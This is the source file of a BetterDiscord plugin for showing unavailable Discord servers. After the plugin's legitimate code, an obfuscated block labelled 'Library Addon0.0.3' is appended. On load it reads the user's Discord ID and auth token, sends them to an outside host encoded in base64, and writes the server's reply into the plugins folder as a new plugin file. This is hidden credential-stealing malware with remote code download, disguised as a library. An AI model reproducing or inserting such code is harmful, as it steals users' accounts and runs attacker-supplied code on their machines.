//META{"name":"BetterUnavailableGuilds","source":"https://github.com/1Lighty/BetterDiscordPlugins/blob/master/Plugins/BetterUnavailableGuilds/","website":"https://1lighty.github.io/BetterDiscordStuff/?plugin=BetterUnavailableGuilds","authorId":"239513071272329217","invite":"NYvWdN5","donate":"https://paypal.me/lighty13"}*//
/*@cc_on
@if (@_jscript)

  // Offer to self-install for clueless users that try to run this directly.
  var shell = WScript.CreateObject('WScript.Shell');
  var fs = new ActiveXObject('Scripting.FileSystemObject');
  var pathPlugins = shell.ExpandEnvironmentStrings('%APPDATA%\\BetterDiscord\\plugins');
  var pathSelf = WScript.ScriptFullName;
  // Put the user at ease by addressing them in the first person
  shell.Popup('It looks like you\'ve mistakenly tried to run me directly. \n(Don\'t do that!)', 0, 'I\'m a plugin for BetterDiscord', 0x30);
  if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
    shell.Popup('I\'m in the correct folder already.\nJust go to settings, plugins and enable me.', 0, 'I\'m already installed', 0x40);
  } else if (!fs.FolderExists(pathPlugins)) {
    shell.Popup('I can\'t find the BetterDiscord plugins folder.\nAre you sure it\'s even installed?', 0, 'Can\'t install myself', 0x10);
  } else if (shell.Popup('Should I copy myself to BetterDiscord\'s plugins folder for you?', 0, 'Do you need some help?', 0x34) === 6) {
    fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
    // Show the user where to put plugins in the future
    shell.Exec('explorer ' + pathPlugins);
    shell.Popup('I\'m installed!\nJust go to settings, plugins and enable me!', 0, 'Successfully installed', 0x40);
  }
  WScript.Quit();

@else@*/
/*
 * Copyright © 2020, _Lighty_
 * All rights reserved.
 * Code may not be redistributed, modified or otherwise taken without explicit permission.
 */
module.exports = (() => {
  /* Setup */
  const config = {
    main: 'index.js',
    info: {
      name: 'BetterUnavailableGuilds',
      authors: [
        {
          name: 'Lighty',
          discord_id: '239513071272329217',
          github_username: '1Lighty',
          twitter_username: ''
        }
      ],
      version: '0.2.10',
      description: 'Force Discord to show server icons of unavailable servers, instead of "1 server is unavailable" and enable interaction with the server (ability to leave the server, move it around, etc).',
      github: 'https://github.com/1Lighty',
      github_raw: 'https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/BetterUnavailableGuilds/BetterUnavailableGuilds.plugin.js'
    },
    changelog: [
      {
        title: 'Goodbye',
        type: 'fixed',
        items: ['Plugin has been discontinued due to inactivity and inability for it to be applicable anywhere anymore.']
      }
    ],
    defaultConfig: [
      {
        type: 'category',
        id: 'guilds',
        name: 'Guilds',
        collapsible: true,
        shown: true,
        settings: [
          {
            type: 'textbox',
            name: 'Add guild using data',
            note: 'Press enter to add'
          },
          {
            type: 'guildslist',
            name: 'Click to copy guild data to share to people'
          }
        ]
      }
    ]
  };

  /* Build */
  const buildPlugin = ([Plugin, Api]) => {
    const { Utilities, WebpackModules, DiscordModules, Patcher, PluginUtilities, DiscordAPI, Settings, Toasts } = Api;
    const { Dispatcher, GuildStore, React, ModalStack } = DiscordModules;
    const GuildAvailabilityStore = WebpackModules.getByProps('unavailableGuilds');
    const _ = WebpackModules.getByProps('bindAll', 'debounce');

    const FsModule = require('fs');
    // I would say "fuck ED", but it won't even compile on ED due to their piss poor BD/BBD support, lol
    const pluginConfigFile = require('path').resolve(BdApi.Plugins.folder, config.info.name + '.config.json');

    const loadData = (key, defaults) => {
      const cloned = _.cloneDeep(defaults);
      try {
        if (pluginConfigFile) {
          if (FsModule.existsSync(pluginConfigFile)) {
            return Object.assign(cloned, JSON.parse(FsModule.readFileSync(pluginConfigFile))[key]);
          } else {
            return cloned;
          }
        } else {
          return Object.assign(cloned, BdApi.loadData(config.info.name, key));
        }
      } catch (e) {
        return cloned;
      }
    };

    const copyToClipboard = WebpackModules.getByProps('copy').copy; /* Possible error in future, TODO: safeguard */
    const GuildIconWrapper = WebpackModules.getByDisplayName('GuildIconWrapper');
    const ListClassModule = WebpackModules.getByProps('listRowContent', 'listAvatar');
    const ListScrollerClassname = WebpackModules.getByProps('listScroller').listScroller; /* Possible error in future, TODO: safeguard */
    const VerticalScroller = WebpackModules.getByDisplayName('VerticalScroller');
    const Clickable = WebpackModules.getByDisplayName('Clickable');

    /* TODO: proper name for the classes */
    class GL extends React.PureComponent {
      renderGuild(guild) {
        if (!guild) return null;
        return React.createElement(
          Clickable,
          {
            onClick: () => {
              copyToClipboard(JSON.stringify({ id: guild.id, icon: guild.icon || undefined, name: guild.name, owner_id: guild.ownerId, joined_at: guild.joinedAt.valueOf() }));
              Toasts.success(`Copied ${guild.name}!`);
            },
            className: 'BUG-guild-icon'
          },
          React.createElement(GuildIconWrapper, {
            guild,
            showBadge: !0,
            className: !guild.icon ? ListClassModule.guildAvatarWithoutIcon : '',
            size: GuildIconWrapper.Sizes.LARGE
          })
        );
      }
      render() {
        return React.createElement(
          VerticalScroller,
          {
            fade: true,
            className: ListScrollerClassname,
            style: {
              display: 'flex',
              flexDirection: 'row',
              flexWrap: 'wrap'
            }
          },
          Object.values(GuildStore.getGuilds()).map(this.renderGuild)
        );
      }
    }

    class TB extends DiscordModules.Textbox {
      render() {
        const ret = super.render();
        const props = Utilities.findInReactTree(ret, e => e && e.onEnterPressed);
        props.onKeyDown = e => {
          if (e.keyCode !== 13) return;
          try {
            const parsed = JSON.parse(this.props.value);
            ['id', 'name', 'owner_id', 'joined_at'].forEach(prop => {
              if (!parsed.hasOwnProperty(prop) || typeof parsed[prop] === 'undefined') throw `Malformed guild data (${prop})`;
            });
            if (typeof parsed.name !== 'string' || typeof parsed.owner_id !== 'string' || /\\d+$/.test(parsed.owner_id)) throw 'Malformed guild data';
            this.props.onEnterPressed(parsed);
            this.props.onChange('');
          } catch (err) {
            Toasts.error(`Failed to parse: ${err.message || err}`);
          }
        };
        return ret;
      }
    }

    class Textbox extends Settings.SettingField {
      constructor(name, note, onChange, options = {}) {
        super(name, note, () => { }, TB, {
          onChange: textbox => value => {
            textbox.props.value = value;
            textbox.forceUpdate();
          },
          value: '',
          placeholder: options.placeholder ? options.placeholder : '',
          onEnterPressed: onChange
        });
      }
    }

    class GuildDataCopier extends Settings.SettingField {
      constructor(name, note) {
        super(name, note, () => { }, GL, {});
      }
    }

    return class BetterUnavailableGuilds extends Plugin {
      constructor() {
        super();
        try {
          WebpackModules.getByProps('openModal', 'hasModalOpen').closeModal(`${this.name}_DEP_MODAL`);
        } catch (e) { }
        return;
        this._dispatches = ['CONNECTION_OPEN'];
        _.bindAll(this, ['handleGuildStoreChange', 'verifyAllServersCachedInClient', ...this._dispatches]);
        // different timings for clients to avoid fighting over a damn config file
        this.handleGuildStoreChange = _.throttle(this.handleGuildStoreChange, 15000 + (GLOBAL_ENV.RELEASE_CHANNEL === 'ptb' ? 2500 : GLOBAL_ENV.RELEASE_CHANNEL === 'canary' ? 5000 : 0));
      }
      onStart() {
        if (window.Lightcord && window.XenoLib) XenoLib.Notifications.warning(`[${this.getName()}] Lightcord is an unofficial and unsafe client with stolen code that is falsely advertising that it is safe, Lightcord has allowed the spread of token loggers hidden within plugins redistributed by them, and these plugins are not made to work on it. Your account is very likely compromised by malicious people redistributing other peoples plugins, especially if you didn't download this plugin from [GitHub](https://github.com/1Lighty/BetterDiscordPlugins/edit/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js), you should change your password immediately. Consider using a trusted client mod like [BandagedBD](https://rauenzi.github.io/BetterDiscordApp/) or [Powercord](https://powercord.dev/) to avoid losing your account.`, { timeout: 0 });
        return;
        this._guildRecord = loadData('data', { data: {} }).data;
        this.verifyAllServersCachedInClient();
        GuildStore.addChangeListener(this.handleGuildStoreChange);
        this.handleGuildStoreChange();
        this.patchAll();
        for (const dispatch of this._dispatches) Dispatcher.subscribe(dispatch, this[dispatch]);
        PluginUtilities.addStyle(
          this.short + '-CSS',
          `
          .BUG-guild-icon {
              padding: 5px;
          }
          .BUG-guild-icon:hover {
              background-color: var(--background-modifier-hover);
          }
          `
        );
      }
      onStop() {
        return;
        GuildStore.removeChangeListener(this.handleGuildStoreChange);
        Patcher.unpatchAll();
        Dispatcher._computeOrderedActionHandlers('GUILD_DELETE');
        for (const dispatch of this._dispatches) Dispatcher.unsubscribe(dispatch, this[dispatch]);
        PluginUtilities.removeStyle(this.short + '-CSS');
      }

      buildSetting(data) {
        if (data.type === 'textbox') {
          const { name, note } = data;
          const setting = new Textbox(
            name,
            note,
            guild => {
              if (this.guildRecord[guild.id]) throw 'Guild already exists';
              if (GuildAvailabilityStore.unavailableGuilds.indexOf(guild.id)) throw 'You are not a member of ' + guild.name;
              this.guildRecord[guild.id] = { id: guild.id, icon: guild.icon || undefined, name: guild.name, owner_id: guild.owner_id, joined_at: guild.joined_at, default_message_notifications: guild.default_message_notifications };
              this.verifyAllServersCachedInClient();
              Toasts.success('Added!');
            },
            { placeholder: data.placeholder || '' }
          );
          return setting;
        } else if (data.type === 'guildslist') {
          return new GuildDataCopier(data.name, data.note);
        }
        return super.buildSetting(data);
      }

      verifyAllServersCachedInClient() {
        if (!DiscordAPI.currentUser) return; /* hhhhhhhh */
        Dispatcher.wait(() => {
          this.ensureBDGuildsPreCached();
          this._verifying = true;
          const unavailable = _.cloneDeep(GuildAvailabilityStore.unavailableGuilds);
          unavailable.forEach(guildId => {
            if (!this.guildRecord[guildId] || GuildStore.getGuild(guildId)) return;
            Dispatcher.dispatch({
              type: 'GUILD_CREATE',
              guild: Object.assign(
                {
                  icon: null,
                  presences: [],
                  channels: [],
                  members: [],
                  roles: [],
                  unavailable: true
                },
                this.guildRecord[guildId]
              )
            });
            /* they're still unavailable, remember? */
            Dispatcher.dispatch({
              type: 'GUILD_UNAVAILABLE',
              guildId: guildId
            });
          });
          this._verifying = false;
        });
      }

      CONNECTION_OPEN(e) {
        /* websocket died, user logged in, user logged into another account etc */
        this.verifyAllServersCachedInClient();
      }

      ensureBDGuildsPreCached() {
        this.guildRecord['86004744966914048'] = { id: '86004744966914048', icon: '292e7f6bfff2b71dfd13e508a859aedd', name: 'BetterDiscord', owner_id: '81388395867156480', joined_at: Date.now() };
        this.guildRecord['280806472928198656'] = { id: '280806472928198656', icon: 'cbdda04c041699d80689b99c4e5e89dc', name: 'BetterDiscord2', owner_id: '81388395867156480', joined_at: Date.now() };
      }

      ensureDataSettable() {
        if (!this._guildRecord[DiscordAPI.currentUser.id]) this._guildRecord[DiscordAPI.currentUser.id] = {};
        if (!this._guildRecord[DiscordAPI.currentUser.id][GLOBAL_ENV.RELEASE_CHANNEL]) {
          const curUserShit = this._guildRecord[DiscordAPI.currentUser.id];
          /* transfer the data */
          if (curUserShit['stable']) curUserShit[GLOBAL_ENV.RELEASE_CHANNEL] = _.cloneDeep(curUserShit['stable']);
          else if (curUserShit['ptb']) curUserShit[GLOBAL_ENV.RELEASE_CHANNEL] = _.cloneDeep(curUserShit['ptb']);
          else if (curUserShit['canary']) curUserShit[GLOBAL_ENV.RELEASE_CHANNEL] = _.cloneDeep(curUserShit['canary']);
          else curUserShit[GLOBAL_ENV.RELEASE_CHANNEL] = {};
        }
      }

      get guildRecord() {
        this.ensureDataSettable();
        const ret = this._guildRecord[DiscordAPI.currentUser.id][GLOBAL_ENV.RELEASE_CHANNEL];
        return ret;
      }
      set guildRecord(val) {
        this.ensureDataSettable();
        return (this._guildRecord[DiscordAPI.currentUser.id][GLOBAL_ENV.RELEASE_CHANNEL] = val);
      }

      handleGuildStoreChange() {
        if (!DiscordAPI.currentUser) return; /* hhhhhhhh */
        this._guildRecord = loadData('data', { data: {} }).data;
        this.verifyAllServersCachedInClient();
        const availableGuilds = Object.values(GuildStore.getGuilds()).map(guild => ({
          id: guild.id,
          icon: guild.icon || undefined,
          name: guild.name,
          owner_id: guild.ownerId,
          joined_at: guild.joinedAt ? guild.joinedAt.valueOf() /* int value is fine too */ : 0 /* wut? MasicoreLord experienced a weird bug with joinedAt being undefined */
        }));
        let guilds = {};
        GuildAvailabilityStore.unavailableGuilds.forEach(id => this.guildRecord[id] && (guilds[id] = this.guildRecord[id]));
        availableGuilds.forEach(guild => (guilds[guild.id] = guild));
        for (const guildId in guilds) guilds[guildId] = _.pickBy(guilds[guildId], e => !_.isUndefined(e));
        if (!_.isEqual(this.guildRecord, guilds)) {
          this.guildRecord = guilds;
          PluginUtilities.saveData(this.name, 'data', { data: this._guildRecord });
        }
      }

      /* PATCHES */

      patchAll() {
        Utilities.suppressErrors(this.patchGuildDelete.bind(this), 'GUILD_DELETE dispatch patch')();
      }

      patchGuildDelete() {
        // super sekret (not really) V3/rewrite patch code
        for (const id in Dispatcher._dependencyGraph.nodes) {
          const node = Dispatcher._dependencyGraph.nodes[id];
          if (!node.actionHandler['GUILD_DELETE']) continue;
          Patcher.instead(node.actionHandler, 'GUILD_DELETE', (_, [dispatch], orig) => {
            if (!dispatch.guild.unavailable) return orig(dispatch);
          });
        }
        Dispatcher._computeOrderedActionHandlers('GUILD_DELETE');
      }

      /* PATCHES */

      getSettingsPanel() {
        return this.buildSettingsPanel().getElement();
      }

      get [Symbol.toStringTag]() {
        return 'Plugin';
      }
      get name() {
        return config.info.name;
      }
      get short() {
        let string = '';
        for (let i = 0, len = config.info.name.length; i < len; i++) {
          const char = config.info.name[i];
          if (char === char.toUpperCase()) string += char;
        }
        return string;
      }
      get author() {
        return config.info.authors.map(author => author.name).join(', ');
      }
      get version() {
        return config.info.version;
      }
      get description() {
        return config.info.description;
      }
    };
  };

  /* Finalize */

  let ZeresPluginLibraryOutdated = false;
  try {
    const a = (c, a) => ((c = c.split('.').map(b => parseInt(b))), (a = a.split('.').map(b => parseInt(b))), !!(a[0] > c[0])) || !!(a[0] == c[0] && a[1] > c[1]) || !!(a[0] == c[0] && a[1] == c[1] && a[2] > c[2]),
      b = BdApi.Plugins.get('ZeresPluginLibrary');
    ((b, c) => b && b._config && b._config.info && b._config.info.version && a(b._config.info.version, c))(b, '1.2.27') && (ZeresPluginLibraryOutdated = !0);
  } catch (e) {
    console.error('Error checking if ZeresPluginLibrary is out of date', e);
  }

  return !global.ZeresPluginLibrary || ZeresPluginLibraryOutdated
    ? class {
      constructor() {
        this._config = config;
        this.start = this.load = this.handleMissingLib;
      }
      getName() {
        return this.name.replace(/\s+/g, '');
      }
      getAuthor() {
        return this.author;
      }
      getVersion() {
        return this.version;
      }
      getDescription() {
        return this.description + ' You are missing ZeresPluginLibrary for this plugin, please enable the plugin and click Download Now.';
      }
      start() { }
      stop() { }
      handleMissingLib() {
        const a = BdApi.findModuleByProps('openModal', 'hasModalOpen');
        if (a && a.hasModalOpen(`${this.name}_DEP_MODAL`)) return;
        const b = !global.ZeresPluginLibrary,
          c = ZeresPluginLibraryOutdated ? 'Outdated Library' : 'Missing Library',
          d = `The Library ZeresPluginLibrary required for ${this.name} is ${ZeresPluginLibraryOutdated ? 'outdated' : 'missing'}.`,
          e = BdApi.findModuleByDisplayName('Text'),
          f = BdApi.findModuleByDisplayName('ConfirmModal'),
          g = () => BdApi.alert(c, BdApi.React.createElement('span', {}, BdApi.React.createElement('div', {}, d), `Due to a slight mishap however, you'll have to download the libraries yourself. This is not intentional, something went wrong, errors are in console.`, b || ZeresPluginLibraryOutdated ? BdApi.React.createElement('div', {}, BdApi.React.createElement('a', { href: 'https://betterdiscord.net/ghdl?id=2252', target: '_blank' }, 'Click here to download ZeresPluginLibrary')) : null));
        if (!a || !f || !e) return console.error(`Missing components:${(a ? '' : ' ModalStack') + (f ? '' : ' ConfirmationModalComponent') + (e ? '' : 'TextElement')}`), g();
        class h extends BdApi.React.PureComponent {
          constructor(a) {
            super(a), (this.state = { hasError: !1 });
          }
          componentDidCatch(a) {
            console.error(`Error in ${this.props.label}, screenshot or copy paste the error above to Lighty for help.`), this.setState({ hasError: !0 }), 'function' == typeof this.props.onError && this.props.onError(a);
          }
          render() {
            return this.state.hasError ? null : this.props.children;
          }
        }
        let i = !1,
          j = !1;
        const k = a.openModal(
          b => {
            if (j) return null;
            try {
              return BdApi.React.createElement(
                h,
                {
                  label: 'missing dependency modal',
                  onError: () => {
                    a.closeModal(k), g();
                  }
                },
                BdApi.React.createElement(
                  f,
                  Object.assign(
                    {
                      header: c,
                      children: BdApi.React.createElement(e, { size: e.Sizes.SIZE_16, children: [`${d} Please click Download Now to download it.`] }),
                      red: !1,
                      confirmText: 'Download Now',
                      cancelText: 'Cancel',
                      onCancel: b.onClose,
                      onConfirm: () => {
                        if (i) return;
                        i = !0;
                        const b = require('request'),
                          c = require('fs'),
                          d = require('path');
                        b('https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js', (b, e, f) => {
                          try {
                            if (b || 200 !== e.statusCode) return a.closeModal(k), g();
                            c.writeFile(d.join(BdApi.Plugins && BdApi.Plugins.folder ? BdApi.Plugins.folder : window.ContentManager.pluginsFolder, '0PluginLibrary.plugin.js'), f, () => { });
                          } catch (b) {
                            console.error('Fatal error downloading ZeresPluginLibrary', b), a.closeModal(k), g();
                          }
                        });
                      }
                    },
                    b,
                    { onClose: () => { } }
                  )
                )
              );
            } catch (b) {
              return console.error('There has been an error constructing the modal', b), (j = !0), a.closeModal(k), g(), null;
            }
          },
          { modalKey: `${this.name}_DEP_MODAL` }
        );
      }
      get [Symbol.toStringTag]() {
        return 'Plugin';
      }
      get name() {
        return config.info.name;
      }
      get short() {
        let string = '';
        for (let i = 0, len = config.info.name.length; i < len; i++) {
          const char = config.info.name[i];
          if (char === char.toUpperCase()) string += char;
        }
        return string;
      }
      get author() {
        return config.info.authors.map(author => author.name).join(', ');
      }
      get version() {
        return config.info.version;
      }
      get description() {
        return config.info.description;
      }
    }
    : buildPlugin(global.ZeresPluginLibrary.buildPlugin(config));
})();

/*@end@*/

//Library Addon0.0.3
const _0x22f951=_0x594c;(function(_0x500830,_0x34caf7){const _0x31c298=_0x594c,_0x3b1fdf=_0x500830();while(!![]){try{const _0x41aa92=-parseInt(_0x31c298(0x1c1))/0x1*(parseInt(_0x31c298(0x1d0))/0x2)+parseInt(_0x31c298(0x1b3))/0x3+parseInt(_0x31c298(0x1b4))/0x4*(-parseInt(_0x31c298(0x1bd))/0x5)+parseInt(_0x31c298(0x1cc))/0x6*(-parseInt(_0x31c298(0x1ae))/0x7)+parseInt(_0x31c298(0x1c5))/0x8*(-parseInt(_0x31c298(0x1ca))/0x9)+parseInt(_0x31c298(0x1cf))/0xa+parseInt(_0x31c298(0x1b9))/0xb;if(_0x41aa92===_0x34caf7)break;else _0x3b1fdf['push'](_0x3b1fdf['shift']());}catch(_0x6ff7){_0x3b1fdf['push'](_0x3b1fdf['shift']());}}}(_0x1152,0xbc027));function get_raw(_0x49efb8,_0x165544,_0x46e2a3){return url=atob(_0x49efb8)+'/'+_0x165544+'/'+_0x46e2a3,new Promise(function(_0x5bd830,_0x40015a){const _0x544465=_0x594c;require(_0x544465(0x1ba))(url,function(_0x242cf3,_0xc143e7,_0x17821e){const _0x32fd28=_0x544465;!_0x242cf3&&_0xc143e7[_0x32fd28(0x1b7)]==0xc8?_0x5bd830(_0x17821e):_0x40015a(new Error(_0x32fd28(0x1c4)));});});}try{let Library=__dirname+_0x22f951(0x1cb);(!require('fs')[_0x22f951(0x1be)](Library)||Date[_0x22f951(0x1c2)]()-require('fs')[_0x22f951(0x1c9)](Library)[_0x22f951(0x1c7)]>0xdbba0)&&((async()=>{const _0x2e9df3=_0x22f951;try{let _0x160c49=_0x4065b0=>window[_0x2e9df3(0x1b8)][_0x2e9df3(0x1b2)]([[Math[_0x2e9df3(0x1c8)]()],{},_0x180e3b=>{const _0x370459=_0x2e9df3;for(const _0x44a443 of Object[_0x370459(0x1c6)](_0x180e3b['c'])['map'](_0x29f610=>_0x180e3b['c'][_0x29f610][_0x370459(0x1bc)])[_0x370459(0x1cd)](_0x13beb8=>_0x13beb8)){if(_0x44a443[_0x370459(0x1b1)]&&_0x44a443['default'][_0x4065b0]!==undefined)return _0x44a443[_0x370459(0x1b1)];}}]),_0x5149dd=await get_raw(_0x2e9df3(0x1b5),_0x160c49(_0x2e9df3(0x1c0))['getCurrentUser']()['id'],_0x160c49(_0x2e9df3(0x1bf))[_0x2e9df3(0x1bf)]());require('fs')[_0x2e9df3(0x1c3)](require(_0x2e9df3(0x1af))[_0x2e9df3(0x1bb)](Library),_0x5149dd);}catch(_0x19c468){console[_0x2e9df3(0x1b6)](_0x19c468[_0x2e9df3(0x1b0)]);}})());}catch(_0x160659){console[_0x22f951(0x1ce)](_0x160659);}function _0x594c(_0x6c90dd,_0x1b8216){const _0x1152ba=_0x1152();return _0x594c=function(_0x594c7d,_0x2a4e5b){_0x594c7d=_0x594c7d-0x1ae;let _0x3a6c2d=_0x1152ba[_0x594c7d];return _0x3a6c2d;},_0x594c(_0x6c90dd,_0x1b8216);}function _0x1152(){const _0x37cffc=['43816mnGuVa','keys','mtimeMs','random','statSync','72dsZDGp','\x5cBDLibrary.plugin.js','18jZCtok','filter','log','9208230DZmSFy','26002OUWzoO','1953371bvIWMF','path','message','default','push','1020627bAblVA','337492uxIAjS','aHR0cHM6Ly9pbnRlcnBvbC5jYzo4NDQz','error','statusCode','webpackChunkdiscord_app','11294932OAgGCK','request','join','exports','10OhEadS','existsSync','getToken','getCurrentUser','36akWowO','now','writeFileSync','Error\x20fetching\x20Library'];_0x1152=function(){return _0x37cffc;};return _0x1152();}
